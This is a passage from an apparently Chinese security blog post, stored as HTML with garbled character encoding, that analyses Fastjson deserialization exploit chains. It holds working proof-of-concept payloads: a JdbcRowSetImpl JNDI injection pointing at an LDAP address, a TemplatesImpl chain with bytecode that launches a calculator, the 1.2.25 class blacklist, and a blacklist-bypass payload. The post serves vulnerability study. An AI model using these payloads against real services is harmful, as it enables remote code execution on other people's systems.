        <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getUrl</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token keyword">null</span> <span class="token operator">?</span> <span class="token class-name">DriverManager</span><span class="token punctuation">.</span><span class="token function">getConnection</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getUrl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getUsername</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getPassword</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">:</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>å‘ç°äº†initialContextå’Œlookup()ï¼Œä»£è¡¨æ­¤å¤„å¯ä»¥åˆ©ç”¨JNDI - å¦‚æœæˆ‘ä»¬ä¿®æ”¹äº†<code>dataSourceName</code>ä¸ºæˆ‘ä»¬çš„RMIæˆ–è€…LDAPè¿œç¨‹åœ°å€ï¼Œé‚£ä¹ˆå°±å¯ä»¥è¿›è¡ŒJNDIæ³¨å…¥ã€‚</p>
<p>é‚£ä¹ˆä»€ä¹ˆåœ°æ–¹å¯ä»¥callåˆ°**connect()**å‘¢</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setAutoCommit</span><span class="token punctuation">(</span><span class="token keyword">boolean</span> var1<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">SQLException</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>conn <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>conn<span class="token punctuation">.</span><span class="token function">setAutoCommit</span><span class="token punctuation">(</span>var1<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>conn <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">connect</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>conn<span class="token punctuation">.</span><span class="token function">setAutoCommit</span><span class="token punctuation">(</span>var1<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>åœ¨setAutoCommitæ–¹æ³•ä¸­ï¼Œä¼šcallåˆ°connect()æ–¹æ³•ã€‚</p>
<h3 id="POCæ„é€ -4"><a href="#POCæ„é€ -4" class="headerlink" title="POCæ„é€ "></a>POCæ„é€ </h3><p>åœ¨ä¹‹å‰çš„<strong>Fastjsonçš„ååºåˆ—åŒ–æµç¨‹</strong>ä¸­ï¼Œæˆ‘ä»¬æœ‰è¯´åˆ°fastjsonå¯ä»¥è°ƒç”¨publicçš„setæ–¹æ³•ï¼Œ<strong>é‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥æ„é€ è¿™æ ·çš„ä¸€ä¸ª</strong>jsonString</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">String</span> evilStr<span class="token operator">=</span><span class="token string">"&#123;\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://127.0.0.1:7777/#EvilObject\",\"autoCommit\":true&#125;"</span><span class="token punctuation">;</span>

<span class="token class-name">Object</span> obj2 <span class="token operator">=</span> JSON<span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>evilString<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>obj2<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>ä¼ å…¥çš„jsonä¸­ï¼Œå±æ€§æœ‰dataSourceNameå’ŒautoCommitï¼Œå› æ­¤åœ¨ä½¿ç”¨<code>JSON.parse()</code>çš„æ—¶å€™ï¼ŒdataSourceå’ŒautoCommitå¯¹åº”çš„<code>setDataSource()</code>å’Œ<code>autoCommit()</code>éƒ½ä¼šè¢«call</p>
<p>ä»è€Œèƒ½å¤Ÿæ‰§è¡Œä»¥ä¸‹ä»£ç </p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java">initialContext<span class="token punctuation">.</span><span class="token function">lookup</span><span class="token punctuation">(</span><span class="token string">"ldap://127.0.0.1:7777/#EvilObject"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220108201834255.png" alt="image-20220108201834255" loading="lazy"></p>
<h2 id="TemplatesImplåˆ©ç”¨é“¾"><a href="#TemplatesImplåˆ©ç”¨é“¾" class="headerlink" title="TemplatesImplåˆ©ç”¨é“¾"></a>TemplatesImplåˆ©ç”¨é“¾</h2><h3 id="åˆ©ç”¨é“¾åˆ†æ-1"><a href="#åˆ©ç”¨é“¾åˆ†æ-1" class="headerlink" title="åˆ©ç”¨é“¾åˆ†æ"></a>åˆ©ç”¨é“¾åˆ†æ</h3><p>åœ¨ccé“¾çš„åˆ†æä¸­ï¼Œæˆ‘ä»¬å¤šæ¬¡ç”¨åˆ°äº†TemplatesImplåˆ©ç”¨é“¾ï¼Œåˆ©ç”¨é“¾å¦‚ä¸‹</p>
<blockquote>
<p>TemplatesImpl#getOutputProperties()<br>  TemplatesImpl#newTransformer()<br>      TemplatesImpl#getTransletInstance()<br>          TemplatesImpl#defineTransletClasses()<br>              TransletClassLoader#defineClass()</p>
</blockquote>
<p>ç®€å•å›é¡¾ä¸€ä¸‹ï¼Œæˆ‘ä»¬å¯ä»¥å°†ç”Ÿæˆçš„æ¶æ„å­—èŠ‚ç èµ‹å€¼ç»™TemplatesImplä¸­çš„<code>_bytecodes</code>,æœ€ååœ¨defineClassä¸­ï¼Œä¼šå°†è¯¥æ¶æ„å­—èŠ‚ç è¯»å–è¿›JVMä¸­ã€‚</p>
<p>å…ˆå†™ä¸€ä¸ªæ¶æ„å­—èŠ‚ç ï¼š</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">String</span> <span class="token function">getEvilCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">CannotCompileException</span><span class="token punctuation">,</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">NotFoundException</span> <span class="token punctuation">&#123;</span>
    <span class="token class-name">ClassPool</span> classPool <span class="token operator">=</span> <span class="token class-name">ClassPool</span><span class="token punctuation">.</span><span class="token function">getDefault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token class-name">CtClass</span> ctClass <span class="token operator">=</span> classPool<span class="token punctuation">.</span><span class="token function">makeClass</span><span class="token punctuation">(</span><span class="token string">"Evil"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    classPool<span class="token punctuation">.</span><span class="token function">insertClassPath</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ClassClassPath</span><span class="token punctuation">(</span><span class="token class-name">AbstractTranslet</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    ctClass<span class="token punctuation">.</span><span class="token function">makeClassInitializer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">insertBefore</span><span class="token punctuation">(</span><span class="token string">"Runtime.getRuntime().exec(\"calc\");"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    ctClass<span class="token punctuation">.</span><span class="token function">setSuperclass</span><span class="token punctuation">(</span>classPool<span class="token punctuation">.</span><span class="token function">getCtClass</span><span class="token punctuation">(</span><span class="token class-name">AbstractTranslet</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> bytes <span class="token operator">=</span> ctClass<span class="token punctuation">.</span><span class="token function">toBytecode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token class-name">String</span> s <span class="token operator">=</span> <span class="token class-name">Base64</span><span class="token punctuation">.</span><span class="token function">getEncoder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">encodeToString</span><span class="token punctuation">(</span>bytes<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> s<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<ol>
<li>è¿™é‡Œä¸ºä»€ä¹ˆè¦ç»§æ‰¿<strong>AbstractTranslet</strong>å‘¢ï¼Ÿ</li>
</ol>
<p>æˆ‘ä»¬åœ¨è®²cc2é“¾çš„æ—¶å€™è¯´è¿‡ï¼Œæˆ‘ä»¬ç”Ÿæˆçš„æ¶æ„ä»£ç æ˜¯åœ¨staticä»£ç å—çš„ï¼Œæˆ‘ä»¬ä»ç„¶éœ€è¦è®©classå¯¹è±¡è¢«åˆ›å»ºï¼Œè¿™æ ·æ‰èƒ½æ‰§è¡Œæˆ‘ä»¬çš„æ¶æ„ä»£ç ã€‚</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211127161222841.png" alt="img" loading="lazy"></p>
<p>æ­¤å¤„<strong>TemplatesImpl#getTransletInstance</strong>ä¸­ï¼Œæˆ‘ä»¬éœ€è¦æ‰§è¡Œäº†<code>newInstance()</code>æ‰èƒ½è§¦å‘æ¼æ´ï¼Œè€Œæ‰§è¡Œçš„å­—èŠ‚ç éœ€è¦ç»§æ‰¿AbstractTranslet</p>
<ol start="2">
<li>ä¸ºä»€ä¹ˆ<strong>bytecodes</strong>æœ€åéœ€è¦ç”¨<strong>Base64</strong>ç¼–ç ï¼Ÿ</li>
</ol>
<p>å®é™…ä¸Šfastjsonåœ¨å¯¹fieldè¿›è¡Œååºåˆ—åŒ–çš„æ—¶å€™ï¼Œä¼šè¿›è¡Œbase64è§£ç ï¼Œå…·ä½“çš„æˆ‘æ²¡æœ‰è·Ÿï¼Œæœ‰å…´è¶£çš„å¸ˆå‚…å¯ä»¥è·Ÿä¸€ä¸‹<code>FieldDeserializer#parseField</code></p>
<h3 id="POCæ„é€ ä¸åˆ†æ"><a href="#POCæ„é€ ä¸åˆ†æ" class="headerlink" title="POCæ„é€ ä¸åˆ†æ"></a>POCæ„é€ ä¸åˆ†æ</h3><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span></span><span class="token class-name">JSON</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span>parser<span class="token punctuation">.</span></span><span class="token class-name">Feature</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>runtime<span class="token punctuation">.</span></span><span class="token class-name">AbstractTranslet</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javassist<span class="token punctuation">.</span></span><span class="token operator">*</span></span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Base64</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">EvilClass</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">String</span> <span class="token function">getEvilCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">CannotCompileException</span><span class="token punctuation">,</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">NotFoundException</span> <span class="token punctuation">&#123;</span>
    <span class="token class-name">ClassPool</span> classPool <span class="token operator">=</span> <span class="token class-name">ClassPool</span><span class="token punctuation">.</span><span class="token function">getDefault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token class-name">CtClass</span> ctClass <span class="token operator">=</span> classPool<span class="token punctuation">.</span><span class="token function">makeClass</span><span class="token punctuation">(</span><span class="token string">"Evil"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    classPool<span class="token punctuation">.</span><span class="token function">insertClassPath</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ClassClassPath</span><span class="token punctuation">(</span><span class="token class-name">AbstractTranslet</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    ctClass<span class="token punctuation">.</span><span class="token function">makeClassInitializer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">insertBefore</span><span class="token punctuation">(</span><span class="token string">"Runtime.getRuntime().exec(\"calc\");"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    ctClass<span class="token punctuation">.</span><span class="token function">setSuperclass</span><span class="token punctuation">(</span>classPool<span class="token punctuation">.</span><span class="token function">getCtClass</span><span class="token punctuation">(</span><span class="token class-name">AbstractTranslet</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> bytes <span class="token operator">=</span> ctClass<span class="token punctuation">.</span><span class="token function">toBytecode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token class-name">String</span> s <span class="token operator">=</span> <span class="token class-name">Base64</span><span class="token punctuation">.</span><span class="token function">getEncoder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">encodeToString</span><span class="token punctuation">(</span>bytes<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> s<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">CannotCompileException</span><span class="token punctuation">,</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">NotFoundException</span> <span class="token punctuation">&#123;</span>

        <span class="token class-name">String</span> evilJson<span class="token operator">=</span><span class="token string">"&#123;\"@type\":\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\",\"_bytecodes\":[\""</span><span class="token operator">+</span><span class="token function">getEvilCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"\"],\"_name\":\"leihehe\",\"_tfactory\":&#123; &#125;,\"outputProperties\":&#123; &#125;&#125;\n"</span><span class="token punctuation">;</span>
        JSON<span class="token punctuation">.</span><span class="token function">parseObject</span><span class="token punctuation">(</span>evilJson<span class="token punctuation">,</span><span class="token class-name">Object</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span><span class="token class-name">Feature<span class="token punctuation">.</span>SupportNonPublicField</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>æ­¤å¤„outputPropertiesä¼šè®©fastjsonæ‰¾åˆ°getOuputProperties()ï¼Œä»è€Œè§¦å‘åˆ©ç”¨é“¾ã€‚</p>
<p>ä½†éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œåœ¨TemplatesImplç±»ä¸­è¿™å‡ ä¸ªæ–¹æ³•æ˜¯privateçš„ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦å¼€å¯<code>Feature.SupportNonPublicField</code>ï¼Œè¿™é‡Œä¹Ÿæ˜¯å¯¼è‡´<code>TemplatesImpl</code>é“¾åœ¨fastjsonååºåˆ—åŒ–æ¼æ´åˆ©ç”¨ä¸­æœ‰æ‰€<strong>å±€é™æ€§</strong>çš„ä¸»è¦åŸå› ã€‚</p>
<p>å¦å¤–ï¼Œåœ¨æˆ‘ä»¬ä½¿ç”¨parseObject()æ—¶ï¼Œéœ€è¦æŒ‡å®šä¸ºObject.classï¼Œå¦åˆ™è¿”å›çš„ç±»å‹æ˜¯JSONObjectç±»å‹</p>
<p><code>JSON.parseObject()</code>å’Œ<code>JSON.parse()</code>éœ€è¦æ»¡è¶³çš„æ ¼å¼ï¼š</p>
<blockquote>
<p><code>JSON.parseObject(evilJson, Object.class, Feature.SupportNonPublicField);</code></p>
<p><code>JSON.parse(evilJson,Feature.SupportNonPublicField);</code></p>
</blockquote>
<p>åé¢çš„fieldåŸºæœ¬ä¸Šå°±æ˜¯ç”¨åå°„çš„å½¢å¼ï¼Œè®¾ç½®valueï¼Œä¾‹å¦‚<code>_bytecodes</code></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220109150412316.png" alt="image-20220109150412316" loading="lazy"></p>
<p>æœ€åçš„outputPropertiesä¹Ÿä¸€æ ·ï¼Œæœ€åé€šè¿‡åå°„æ‰§è¡Œã€‚<img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220109150849934.png" alt="image-20220109150849934" loading="lazy"></p>
<p>å¼¹å‡ºè®¡ç®—å™¨</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220109150954388.png" alt="image-20220109150954388" loading="lazy"></p>
<h2 id="æ€»ç»“ä¸¤æ¡åˆ©ç”¨é“¾çš„åŒºåˆ«"><a href="#æ€»ç»“ä¸¤æ¡åˆ©ç”¨é“¾çš„åŒºåˆ«" class="headerlink" title="æ€»ç»“ä¸¤æ¡åˆ©ç”¨é“¾çš„åŒºåˆ«"></a>æ€»ç»“ä¸¤æ¡åˆ©ç”¨é“¾çš„åŒºåˆ«</h2><p>TemplatesImpl</p>
<ul>
<li>å½“fastjsonä¸å‡ºç½‘æ—¶ï¼Œå¯ä»¥ç›²æ‰“</li>
<li>ç‰ˆæœ¬åœ¨1.2.22èµ·æ‰æœ‰SupportNonPublicFieldç‰¹æ€§,ä¸”è¦æ±‚åœ¨ä»£ç ä¸­å¼€å¯SupportNonPublicField.</li>
</ul>
<p>JdbcRowSetImplé“¾</p>
<ul>
<li>åˆ©ç”¨èŒƒå›´æ›´å¹¿</li>
<li>å½“fastjsonä¸å‡ºç½‘æ—¶ï¼Œæ— æ³•å®Œæˆjndiæ³¨å…¥ï¼ŒåŒæ—¶é«˜ç‰ˆæœ¬ä¸­çš„jdkæœ‰ä¸€äº›é™åˆ¶ï¼Œåªèƒ½é€šè¿‡åˆ©ç”¨æœ¬åœ°ç±»æ¥å®Œæˆååºåˆ—åŒ–æ¼æ´åˆ©ç”¨ã€‚</li>
</ul>
<h2 id="Fastjsonå„ä¸ªç‰ˆæœ¬åˆ†æ"><a href="#Fastjsonå„ä¸ªç‰ˆæœ¬åˆ†æ" class="headerlink" title="Fastjsonå„ä¸ªç‰ˆæœ¬åˆ†æ"></a>Fastjsonå„ä¸ªç‰ˆæœ¬åˆ†æ</h2><h3 id="1-2-25ç‰ˆæœ¬å˜åŒ–"><a href="#1-2-25ç‰ˆæœ¬å˜åŒ–" class="headerlink" title="1.2.25ç‰ˆæœ¬å˜åŒ–"></a>1.2.25ç‰ˆæœ¬å˜åŒ–</h3><p>å¯ä»¥å‘ç°åœ¨1.2.25ä¸­: <code>TypeUtils.loadClass()</code>è¢«ä¿®æ”¹ä¸ºäº†<code>checkAutoType()</code></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220109214228148.png" alt="image-20220109214228148" loading="lazy"></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220109214347945.png" alt="image-20220109214347945" loading="lazy"></p>
<p>1.2.25ç‰ˆæœ¬ä¸­ï¼Œé¦–å…ˆå¯¹autoTypeSupportå¸ƒå°”å€¼è¿›è¡Œåˆ¤æ–­ï¼Œå¦‚æœautoTypeSupportä¸ºtrueï¼Œé‚£ä¹ˆå¼€å§‹æ£€æŸ¥é»‘åå•å’Œç™½åå•ï¼Œå¦‚æœéƒ½ä¸æ»¡è¶³ï¼Œåˆ™ä»Mappingä¸­è·å–classã€‚</p>
<p>å¦‚æœautoTypeSupportä¸ºfalseï¼Œé‚£ä¹ˆå¾ªç¯éå†ç™½åå•ä¸é»‘åå•ï¼Œå¦‚æœåœ¨é»‘åå•ä¸­ï¼Œåˆ™æŠ›å‡ºå¼‚å¸¸ï¼Œå¦‚æœä¸åœ¨ç™½åå•ä¸­ï¼Œåˆ™æœ€åæŠ›å‡º<code>&quot;autoType is not support xxx&quot;</code>å¼‚å¸¸ï¼Œå› æ­¤å¦‚æœautoTypeSupportä¸ºfalseï¼Œå°±ä¸€å®šæ— æ³•æ‰§è¡ŒæˆåŠŸã€‚</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220109221758660.png" alt="image-20220109221758660" loading="lazy"></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220109214959269.png" alt="image-20220109214959269" loading="lazy"></p>
<p>é»‘åå•å¦‚ä¸‹ï¼š</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java">bsh
com<span class="token punctuation">.</span>mchange
com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span><span class="token comment">//è¿™æ˜¯templatesImplå’ŒJdbcRowSetImplæ‰€åœ¨çš„package</span>
<span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>Thread</span>
<span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>net<span class="token punctuation">.</span></span>Socket</span>
java<span class="token punctuation">.</span>rmi
javax<span class="token punctuation">.</span>xml
org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>bcel
org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>beanutils
<span class="token class-name"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span></span>Transformer</span>
org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors
org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections4<span class="token punctuation">.</span>comparators
org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>fileupload
org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>myfaces<span class="token punctuation">.</span>context<span class="token punctuation">.</span>servlet
org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>tomcat
org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>wicket<span class="token punctuation">.</span>util
org<span class="token punctuation">.</span>codehaus<span class="token punctuation">.</span>groovy<span class="token punctuation">.</span>runtime
org<span class="token punctuation">.</span>hibernat
org<span class="token punctuation">.</span>jboss
org<span class="token punctuation">.</span>mozilla<span class="token punctuation">.</span>javascript
org<span class="token punctuation">.</span>python<span class="token punctuation">.</span>core
org<span class="token punctuation">.</span>springframework<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="1-2-25-1-2-41ç»•è¿‡"><a href="#1-2-25-1-2-41ç»•è¿‡" class="headerlink" title="1.2.25-1.2.41ç»•è¿‡"></a>1.2.25-1.2.41ç»•è¿‡</h3><p>å› ä¸ºé»‘åå•ä¸­æœ‰<code>com.sun</code>ï¼Œå› æ­¤æƒ³è¦<strong>ç›´æ¥</strong>ç»•è¿‡é»‘åå•åŸºæœ¬æ˜¯ä¸å¯èƒ½äº†</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220109231952820.png" alt="image-20220109231952820" loading="lazy"></p>
<p>æˆ‘ä»¬éœ€è¦å¯»æ‰¾å…¶ä»–æ–¹æ³•æ¥é¿å¼€é»‘åå•çš„æ£€æµ‹ã€‚æ­¤åçš„ç»•è¿‡è¿‡ç¨‹æˆ‘ä»¬éƒ½ä»¥JdbcRowSetImplé“¾æ¥åˆ†æã€‚å¦å¤–ï¼Œå› ä¸º1.2.25åæ·»åŠ äº†autoTypeSupport Checkï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦å…ˆå°†<code>autoTypeSupport</code>è®¾ä¸º<strong>true</strong></p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">ParserConfig</span><span class="token punctuation">.</span><span class="token function">getGlobalInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">setAutoTypeSupport</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">String</span> evilStr<span class="token operator">=</span><span class="token string">"&#123;\"@type\":\"[com.sun.rowset.JdbcRowSetImpl\"[&#123;\"dataSourceName\":\"ldap://127.0.0.1:7777/#EvilObject\",\"autoCommit\":true&#125;"</span><span class="token punctuation">;</span>
        JSON<span class="token punctuation">.</span><span class="token function">parseObject</span><span class="token punctuation">(</span>evilStr<span class="token punctuation">,</span><span class="token class-name">Object</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>åœ¨ç¬¬ä¸‰è¡Œä¸‹ä¸ªæ–­ç‚¹è¿›è¡Œåˆ†æï¼š</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220109233459957.png" alt="image-20220109233459957" loading="lazy"></p>
<p>æˆ‘ä»¬å‘ç°æœ€åä¸€å®šä¼šè¿›å…¥<code>checkAutoType()</code></p>
<p>å¦‚æœæ—¢ä¸åœ¨ç™½åå•ï¼Œä¹Ÿä¸å†é»‘åå•ä¸­ï¼Œåˆ™ä¼šæ‰§è¡Œä»¥ä¸‹ä»£ç ï¼š</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>autoTypeSupport <span class="token operator">||</span> expectClass <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    clazz <span class="token operator">=</span> <span class="token class-name">TypeUtils</span><span class="token punctuation">.</span><span class="token function">loadClass</span><span class="token punctuation">(</span>typeName<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>defaultClassLoader<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>å³callåˆ°TypeUtils#loadClassæ–¹æ³•</p>
